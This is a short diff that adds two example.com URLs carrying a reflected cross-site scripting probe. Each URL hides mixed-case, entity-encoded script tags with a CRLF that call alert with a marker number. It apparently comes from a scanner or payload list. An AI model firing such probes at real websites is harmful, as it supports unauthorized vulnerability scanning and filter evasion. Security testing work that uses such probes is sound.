@@ -1,0 +1,2 @@
+http://www.example.com/search.php?Keywords=1&gt;&quot;&gt;&lt;ScRiPt %0D%0A&gt;alert(412646446896)%3B&lt;/ScRiPt&gt;
+http://www.example.com/browse.php?SearchIndex=1&gt;&quot;&gt;&lt;ScRiPt %0D%0A&gt;alert(412646446896)%3B&lt;/ScRiPt&gt;
